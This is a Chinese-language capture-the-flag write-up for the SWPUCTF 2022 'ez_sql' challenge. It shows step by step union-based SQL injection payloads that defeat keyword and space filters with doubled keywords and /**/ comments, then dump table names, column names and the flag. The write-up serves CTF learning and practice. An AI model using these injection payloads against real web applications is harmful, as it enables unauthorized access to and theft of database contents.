# 【SWPUCTF 2022 新生赛】jez_sql


# [SWPUCTF 2022 新生赛]ez_sql

## 思路
* 看题目就是sql注入
* 进去就是nss的POST传参sql爆破

## EXP

直接上语句

先发现是字符型注入。然后就按套路

```
nss=-1&#39;#
```

这里order by 发现or被去掉

空格发现报错

双写绕过or，空格用/**/代替

查出是3列

```
nss=-1&#39;/**/oorrder/**/by/**/1,2,3#
```

联合查询

union过滤双写绕过

爆库发现回显无变化，考虑用limit

```
nss=-1&#39;/**/ununionion/**/select/**/1,2,database()/**/limit/**/1,1#
```

爆表

or过滤绕过

```
nss=-1&#39;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#39;NSS_db&#39;/**/limit/**/1,1#
```

```
NSS_tb,users
```

爆字段

&gt; 以user为例，实际上user并无啥用
&gt;
&gt; 因此sql题还是随手记指令QAQ

```
nss=-1&#39;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#39;users&#39;/**/limit/**/1,1#
```

```
id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS		//users

id,Secr3t,flll444g		//NSS_tb
```

得到字段直接查询

```
nss=-1&#39;/**/ununionion/**/select/**/1,2,username/**/from/**/users/**/limit/**/1,1#		//users（啥都没有）

nss=-1&#39;/**/ununionion/**/select/**/1,Secr3t,flll444g/**/from/**/NSS_tb/**/limit/**/1,1#			//NSS_tb	
```

## 总结

* sql注入
* 双写过滤绕过
* 翻页
* 空格过滤绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_sql/  

